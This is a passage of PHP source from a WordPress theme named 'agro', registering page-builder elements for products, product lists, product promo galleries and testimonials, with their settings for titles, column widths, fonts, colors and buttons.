                    'element' => 'anim2',
                    'not_empty' => true
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'offset2',
                'heading' => esc_html__('Animation offset', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'dependency' => array(
                    'element' => 'anim2',
                    'not_empty' => true
                )
            ),
            // fonts
            array(
                'type' => 'nt_spacer',
                'param_name' => 'fonts_spacer',
                'heading' => esc_html__('Heading Fonts Customize', 'agro'),
                'group' => esc_html__('Fonts', 'agro')
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'usefonts',
                'heading' => esc_html__('Use Google Fonts?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'description' => esc_html__('If checked, the section background image will be disabled on max 992px.', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Heading tag', 'agro'),
                'param_name' => 'htag',
                'group' => esc_html__('Fonts', 'agro'),
                'value' => array(
                    esc_html__('Select tag', 'agro') => '',
                    esc_html__('h1', 'agro') => 'h1',
                    esc_html__('h2', 'agro') => 'h2',
                    esc_html__('h3', 'agro') => 'h3',
                    esc_html__('h4', 'agro') => 'h4',
                    esc_html__('h5', 'agro') => 'h5',
                    esc_html__('h6', 'agro') => 'h6',
                    esc_html__('div', 'agro') => 'div',
                    esc_html__('p', 'agro') => 'p',
                    esc_html__('span', 'agro') => 'span'
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'tsize',
                'heading' => esc_html__('Font size', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lheight',
                'heading' => esc_html__('Line height', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'google_fonts',
                'param_name' => 'google_fonts',
                'value' => 'font_family:Abril%20Fatface%3Aregular|font_style:400%20regular%3A400%3Anormal',
                'group' => esc_html__('Fonts', 'agro'),
                'settings' => array(
                    'fields' => array(
                        'font_family_description' => esc_html__( 'Select font family.', 'agro' ),
                        'font_style_description' => esc_html__( 'Select font styling.', 'agro' )
                    )
                ),
                'dependency' => array(
                    'element' => 'usefonts',
                    'not_empty' => true
                )
            ),
            // color
            array(
                'type' => 'nt_spacer',
                'param_name' => 'sec_spacer',
                'heading' => esc_html__('Section Text Color Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'tclr',
                'heading' => esc_html__('Title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'thclr',
                'heading' => esc_html__('Thin title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'descclr',
                'heading' => esc_html__('Description color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro')
            )
        )));
    }
}


/*******************************/
/* Product
/******************************/
if (!function_exists('agro_product_integrateWithVC')) {
    add_action('vc_before_init', 'agro_product_integrateWithVC');
    function agro_product_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Product', 'agro'),
        'base' => 'agro_product',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'checkbox',
                'param_name' => 'usefonts',
                'heading' => esc_html__('Full-width?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'description' => esc_html__('check this after Row settings if you want to use full width', 'agro'),
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'stitle',
                'heading' => esc_html__('Section Title', 'agro'),
                'edit_field_class' => 'vc_col-sm-6 pt15',
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'sthintitle',
                'heading' => esc_html__('Section Thin Title', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
            ),
            array(
                'type' => 'textarea',
                'param_name' => 'sdesc',
                'heading' => esc_html__('Section Description', 'agro'),
            ),
            array(
                'type' => 'vc_link',
                'param_name' => 'link',
                'heading' => esc_html__('Section Button', 'agro'),
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('XL Column Width', 'agro'),
                'description' => esc_html__('XL : X-Large Device', 'agro'),
                'param_name' => 'sxl',
                'edit_field_class' => 'vc_col-sm-6',
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('1 column', 'agro') => 'col-xl-1',
                    esc_html__('2 column', 'agro') => 'col-xl-2',
                    esc_html__('3 column', 'agro') => 'col-xl-3',
                    esc_html__('4 column', 'agro') => 'col-xl-4',
                    esc_html__('5 column', 'agro') => 'col-xl-5',
                    esc_html__('6 column', 'agro') => 'col-xl-6',
                    esc_html__('7 column', 'agro') => 'col-xl-7',
                    esc_html__('8 column', 'agro') => 'col-xl-8',
                    esc_html__('9 column', 'agro') => 'col-xl-9',
                    esc_html__('10 column', 'agro') => 'col-xl-10',
                    esc_html__('11 column', 'agro') => 'col-xl-11',
                    esc_html__('12 column', 'agro') => 'col-xl-12'
                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('MD Column Width', 'agro'),
                'description' => esc_html__('MD : Medium Device', 'agro'),
                'param_name' => 'smd',
                'edit_field_class' => 'vc_col-sm-6',
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('1 column', 'agro') => 'col-md-1',
                    esc_html__('2 column', 'agro') => 'col-md-2',
                    esc_html__('3 column', 'agro') => 'col-md-3',
                    esc_html__('4 column', 'agro') => 'col-md-4',
                    esc_html__('5 column', 'agro') => 'col-md-5',
                    esc_html__('6 column', 'agro') => 'col-md-6',
                    esc_html__('7 column', 'agro') => 'col-md-7',
                    esc_html__('8 column', 'agro') => 'col-md-8',
                    esc_html__('9 column', 'agro') => 'col-md-9',
                    esc_html__('10 column', 'agro') => 'col-md-10',
                    esc_html__('11 column', 'agro') => 'col-md-11',
                    esc_html__('12 column', 'agro') => 'col-md-12'
                )
            ),
            array(
                'type' => 'param_group',
                'param_name' => 'loop',
                'heading' => esc_html__('Create Product', 'agro'),
                'group' => esc_html__('Product', 'agro'),
                'params' => array(
                    array(
                        'type' => 'attach_image',
                        'param_name' => 'img',
                        'heading' => esc_html__('Item image', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6',
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'title',
                        'heading' => esc_html__('Item title', 'agro'),
                        'edit_field_class' => 'vc_col-sm-8',
                    ),
                    array(
                        'type' => 'dropdown',
                        'heading' => esc_html__('Title Tag', 'agro'),
                        'param_name' => 'tag',
                        'edit_field_class' => 'vc_col-sm-4',
                        'value' => array(
                            esc_html__('Select a option', 'agro') => '',
                            esc_html__('H2', 'agro') => 'h2',
                            esc_html__('H3', 'agro') => 'h3',
                        )
                    ),
                    array(
                        'type' => 'vc_link',
                        'param_name' => 'plink',
                        'heading' => esc_html__('Item Link', 'agro'),
                    ),
                    array(
                        'type' => 'dropdown',
                        'heading' => esc_html__('MD Column Width', 'agro'),
                        'description' => esc_html__('MD : Meidum Device', 'agro'),
                        'param_name' => 'md',
                        'edit_field_class' => 'vc_col-sm-4',
                        'value' => array(
                            esc_html__('Select a option', 'agro') => '',
                            esc_html__('1 column', 'agro') => 'col-md-1',
                            esc_html__('2 column', 'agro') => 'col-md-2',
                            esc_html__('3 column', 'agro') => 'col-md-3',
                            esc_html__('4 column', 'agro') => 'col-md-4',
                            esc_html__('5 column', 'agro') => 'col-md-5',
                            esc_html__('6 column', 'agro') => 'col-md-6',
                            esc_html__('7 column', 'agro') => 'col-md-7',
                            esc_html__('8 column', 'agro') => 'col-md-8',
                            esc_html__('9 column', 'agro') => 'col-md-9',
                            esc_html__('10 column', 'agro') => 'col-md-10',
                            esc_html__('11 column', 'agro') => 'col-md-11',
                            esc_html__('12 column', 'agro') => 'col-md-12'
                        )
                    ),
                    array(
                        'type' => 'dropdown',
                        'heading' => esc_html__('XL Column Width', 'agro'),
                        'description' => esc_html__('XL : X-Large Device', 'agro'),
                        'param_name' => 'xl',
                        'edit_field_class' => 'vc_col-sm-4',
                        'value' => array(
                            esc_html__('Select a option', 'agro') => '',
                            esc_html__('1 column', 'agro') => 'col-xl-1',
                            esc_html__('2 column', 'agro') => 'col-xl-2',
                            esc_html__('3 column', 'agro') => 'col-xl-3',
                            esc_html__('4 column', 'agro') => 'col-xl-4',
                            esc_html__('5 column', 'agro') => 'col-xl-5',
                            esc_html__('6 column', 'agro') => 'col-xl-6',
                            esc_html__('7 column', 'agro') => 'col-xl-7',
                            esc_html__('8 column', 'agro') => 'col-xl-8',
                            esc_html__('9 column', 'agro') => 'col-xl-9',
                            esc_html__('10 column', 'agro') => 'col-xl-10',
                            esc_html__('11 column', 'agro') => 'col-xl-11',
                            esc_html__('12 column', 'agro') => 'col-xl-12'
                        )
                    ),
                    array(
                        'type' => 'dropdown',
                        'heading' => esc_html__('XL Column Offset', 'agro'),
                        'description' => esc_html__('XL : X-Large Device', 'agro'),
                        'param_name' => 'xl_off',
                        'group' => esc_html__('Responsive Options', 'agro'),
                        'edit_field_class' => 'vc_col-sm-4',
                        'value' => array(
                            esc_html__('Select a option', 'agro') => '',
                            esc_html__('1 column', 'agro') => 'offset-xl-1',
                            esc_html__('2 column', 'agro') => 'offset-xl-2',
                            esc_html__('3 column', 'agro') => 'offset-xl-3',
                            esc_html__('4 column', 'agro') => 'offset-xl-4',
                            esc_html__('5 column', 'agro') => 'offset-xl-5',
                            esc_html__('6 column', 'agro') => 'offset-xl-6',
                            esc_html__('7 column', 'agro') => 'offset-xl-7',
                            esc_html__('8 column', 'agro') => 'offset-xl-8',
                            esc_html__('9 column', 'agro') => 'offset-xl-9',
                            esc_html__('10 column', 'agro') => 'offset-xl-10',
                            esc_html__('11 column', 'agro') => 'offset-xl-11',
                            esc_html__('12 column', 'agro') => 'offset-xl-12'
                        )
                    ),
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgw',
                'heading' => esc_html__('Product image width', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'group' => esc_html__('Product', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgh',
                'heading' => esc_html__('Product image height', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'group' => esc_html__('Product', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            // fonts
            array(
                'type' => 'nt_spacer',
                'param_name' => 'fonts_spacer',
                'heading' => esc_html__('Heading Fonts Customize', 'agro'),
                'group' => esc_html__('Fonts', 'agro')
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'usefonts',
                'heading' => esc_html__('Use Google Fonts?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'description' => esc_html__('If checked, the section background image will be disabled on max 992px.', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Heading tag', 'agro'),
                'param_name' => 'htag',
                'group' => esc_html__('Fonts', 'agro'),
                'value' => array(
                    esc_html__('Select tag', 'agro') => '',
                    esc_html__('h1', 'agro') => 'h1',
                    esc_html__('h2', 'agro') => 'h2',
                    esc_html__('h3', 'agro') => 'h3',
                    esc_html__('h4', 'agro') => 'h4',
                    esc_html__('h5', 'agro') => 'h5',
                    esc_html__('h6', 'agro') => 'h6',
                    esc_html__('div', 'agro') => 'div',
                    esc_html__('p', 'agro') => 'p',
                    esc_html__('span', 'agro') => 'span'
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'tsize',
                'heading' => esc_html__('Font size', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lheight',
                'heading' => esc_html__('Line height', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'google_fonts',
                'param_name' => 'google_fonts',
                'value' => 'font_family:Abril%20Fatface%3Aregular|font_style:400%20regular%3A400%3Anormal',
                'group' => esc_html__('Fonts', 'agro'),
                'settings' => array(
                    'fields' => array(
                        'font_family_description' => esc_html__( 'Select font family.', 'agro' ),
                        'font_style_description' => esc_html__( 'Select font styling.', 'agro' )
                    )
                ),
                'dependency' => array(
                    'element' => 'usefonts',
                    'not_empty' => true
                )
            ),
            //color
            array(
                'type' => 'nt_spacer',
                'param_name' => 'product_spacer',
                'heading' => esc_html__('Product Color Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'overlay',
                'heading' => esc_html__('Hover product overlay color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'tclr',
                'heading' => esc_html__('Title color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'thvrclr',
                'heading' => esc_html__('Hover title color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'nt_spacer',
                'param_name' => 'sec_spacer',
                'heading' => esc_html__('Section Text Color Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'sectclr',
                'heading' => esc_html__('Title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'dclr',
                'heading' => esc_html__('Description color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'nt_spacer',
                'param_name' => 'btn_spacer',
                'heading' => esc_html__('Section Button Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Button type', 'agro'),
                'param_name' => 'btntype',
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro'),
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('Round', 'agro') => 'btn-round',
                    esc_html__('Square', 'agro') => 'btn-square',
                    esc_html__('Rounded', 'agro') => 'btn-rounded'
                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Button style', 'agro'),
                'param_name' => 'btnstyle',
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro'),
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('Outline to Solid', 'agro') => 'custom-btn--style-1',
                    esc_html__('Solid to Outline', 'agro') => 'custom-btn--style-4'
                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Button size', 'agro'),
                'param_name' => 'btnsize',
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro'),
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('Big', 'agro') => 'custom-btn--big',
                    esc_html__('Medium', 'agro') => 'custom-btn--medium',
                    esc_html__('Small', 'agro') => 'custom-btn--small'
                )
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr2',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnbg',
                'heading' => esc_html__('Button background', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnhvrbg',
                'heading' => esc_html__('Hover button background', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr3',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnclr',
                'heading' => esc_html__('Button title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnhvrclr',
                'heading' => esc_html__('Hover button title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr4',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnbrd',
                'heading' => esc_html__('Button border color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnhvrbrd',
                'heading' => esc_html__('Hover button border color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro')
            )
        )));
    }
}

/*******************************/
/* Product list
/******************************/
if (!function_exists('agro_product_list_integrateWithVC')) {
    add_action('vc_before_init', 'agro_product_list_integrateWithVC');
    function agro_product_list_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Product List', 'agro'),
        'base' => 'agro_product_list',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'param_group',
                'param_name' => 'loop',
                'heading' => esc_html__('Create Product List', 'agro'),
                'group' => esc_html__('Product', 'agro'),
                'params' => array(
                    array(
                        'type' => 'attach_image',
                        'param_name' => 'img',
                        'heading' => esc_html__('Item image', 'agro')
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'title',
                        'heading' => esc_html__('Item title', 'agro')
                    ),
                    array(
                        'type' => 'textarea',
                        'param_name' => 'desc',
                        'heading' => esc_html__('Item title', 'agro')
                    ),
                    array(
                        'type' => 'vc_link',
                        'param_name' => 'plink',
                        'heading' => esc_html__('Item button title and link', 'agro')
                    ),
                    array(
                        'type' => 'attach_image',
                        'param_name' => 'bgimg',
                        'heading' => esc_html__('Item background parallax image', 'agro'),
                    ),
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgw',
                'heading' => esc_html__('Product Image Width', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'group' => esc_html__('Product', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgh',
                'heading' => esc_html__('Product Image Height', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'group' => esc_html__('Product', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'bgimgw',
                'heading' => esc_html__('Background Image Width', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'group' => esc_html__('Product', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'bgimgh',
                'heading' => esc_html__('Product Image Height', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'group' => esc_html__('Product', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'nt_spacer',
                'param_name' => 'sec_spacer',
                'heading' => esc_html__('Product Color Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'tclr',
                'heading' => esc_html__('Title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'descclr',
                'heading' => esc_html__('Description color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'nt_spacer',
                'param_name' => 'btn_spacer',
                'heading' => esc_html__('Product Button Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Button type', 'agro'),
                'param_name' => 'btntype',
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro'),
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('Round', 'agro') => 'btn-round',
                    esc_html__('Square', 'agro') => 'btn-square',
                    esc_html__('Rounded', 'agro') => 'btn-rounded'
                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Button style', 'agro'),
                'param_name' => 'btnstyle',
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro'),
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('Outline to Solid', 'agro') => 'custom-btn--style-1',
                    esc_html__('Solid to Outline', 'agro') => 'custom-btn--style-4'
                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Button size', 'agro'),
                'param_name' => 'btnsize',
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro'),
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('Big', 'agro') => 'custom-btn--big',
                    esc_html__('Medium', 'agro') => 'custom-btn--medium',
                    esc_html__('Small', 'agro') => 'custom-btn--small'
                )
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr2',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnbg',
                'heading' => esc_html__('Button background', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnhvrbg',
                'heading' => esc_html__('Hover button background', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr3',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnclr',
                'heading' => esc_html__('Button title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnhvrclr',
                'heading' => esc_html__('Hover button title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr4',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnbrd',
                'heading' => esc_html__('Button border color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnhvrbrd',
                'heading' => esc_html__('Hover button border color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro')
            )
        )));
    }
}

/*******************************/
/* product promo gallery
/******************************/
if (!function_exists('agro_product_promo_integrateWithVC')) {
    add_action('vc_before_init', 'agro_product_promo_integrateWithVC');
    function agro_product_promo_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Product Promo', 'agro'),
        'base' => 'agro_product_promo',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(

            array(
                'type' => 'param_group',
                'param_name' => 'loop',
                'heading' => esc_html__('Create Product Promo Gallery', 'agro'),
                'params' => array(
                    array(
                        'type' => 'checkbox',
                        'param_name' => 'h2y',
                        'heading' => esc_html__('Height Image 2Y?', 'agro'),
                        'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                        'description' => esc_html__('If checked, the height image will be 2Y.', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6 pt15',
                    ),
                    array(
                        'type' => 'attach_image',
                        'param_name' => 'img',
                        'heading' => esc_html__('Item Image', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6',
                    ),

                    array(
                        'type' => 'textfield',
                        'param_name' => 'title',
                        'heading' => esc_html__('Item Title', 'agro'),
                        'edit_field_class' => 'vc_col-sm-5',
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'thintitle',
                        'heading' => esc_html__('Item Thin Title', 'agro'),
                        'edit_field_class' => 'vc_col-sm-5',
                    ),
                    array(
                        'type' => 'dropdown',
                        'heading' => esc_html__('Title Tag', 'agro'),
                        'param_name' => 'tag',
                        'edit_field_class' => 'vc_col-sm-2',
                        'value' => array(
                            esc_html__('Select a option', 'agro') => '',
                            esc_html__('H2', 'agro') => 'h2',
                            esc_html__('H3', 'agro') => 'h3',
                        )
                    ),
                    array(
                        'type' => 'vc_link',
                        'param_name' => 'plink',
                        'heading' => esc_html__('Item Link', 'agro'),
                    ),
                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('MD Column Width', 'agro'),
                'description' => esc_html__('MD : Meidum Device', 'agro'),
                'param_name' => 'md',
                'edit_field_class' => 'vc_col-sm-6',
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('1 column', 'agro') => 'col-md-1',
                    esc_html__('2 column', 'agro') => 'col-md-2',
                    esc_html__('3 column', 'agro') => 'col-md-3',
                    esc_html__('4 column', 'agro') => 'col-md-4',
                    esc_html__('5 column', 'agro') => 'col-md-5',
                    esc_html__('6 column', 'agro') => 'col-md-6',
                    esc_html__('7 column', 'agro') => 'col-md-7',
                    esc_html__('8 column', 'agro') => 'col-md-8',
                    esc_html__('9 column', 'agro') => 'col-md-9',
                    esc_html__('10 column', 'agro') => 'col-md-10',
                    esc_html__('11 column', 'agro') => 'col-md-11',
                    esc_html__('12 column', 'agro') => 'col-md-12'
                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('SM Column Width', 'agro'),
                'description' => esc_html__('SM : Small Device', 'agro'),
                'param_name' => 'sm',
                'edit_field_class' => 'vc_col-sm-6',
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('1 column', 'agro') => 'col-sm-1',
                    esc_html__('2 column', 'agro') => 'col-sm-2',
                    esc_html__('3 column', 'agro') => 'col-sm-3',
                    esc_html__('4 column', 'agro') => 'col-sm-4',
                    esc_html__('5 column', 'agro') => 'col-sm-5',
                    esc_html__('6 column', 'agro') => 'col-sm-6',
                    esc_html__('7 column', 'agro') => 'col-sm-7',
                    esc_html__('8 column', 'agro') => 'col-sm-8',
                    esc_html__('9 column', 'agro') => 'col-sm-9',
                    esc_html__('10 column', 'agro') => 'col-sm-10',
                    esc_html__('11 column', 'agro') => 'col-sm-11',
                    esc_html__('12 column', 'agro') => 'col-sm-12'
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgw',
                'heading' => esc_html__('Product image width', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgh',
                'heading' => esc_html__('Product image height', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'nt_spacer',
                'param_name' => 'sec_spacer',
                'heading' => esc_html__('Product Color Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'tclr',
                'heading' => esc_html__('Title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'thclr',
                'heading' => esc_html__('Thin title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro')
            )
        )));
    }
}


/*******************************/
/* review
/******************************/
if (!function_exists('agro_review_integrateWithVC')) {
    add_action('vc_before_init', 'agro_review_integrateWithVC');
    function agro_review_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Testimonials', 'agro'),
        'base' => 'agro_review',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Section Background Style', 'agro'),
                'param_name' => 'style',
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('Parallax Background', 'agro') => 'parallax',
                    esc_html__('Static Background', 'agro') => 'static',
                )
            ),
            array(
                'type' => 'attach_image',
                'param_name' => 'bgimg',
                'heading' => esc_html__('Section Background Image', 'agro'),
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'title',
                'heading' => esc_html__('Section Title', 'agro'),
                'edit_field_class' => 'vc_col-sm-6 pt15',
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'thintitle',
                'heading' => esc_html__('Section Thin Title', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
            ),
            array(
                'type' => 'textarea',
                'param_name' => 'desc',
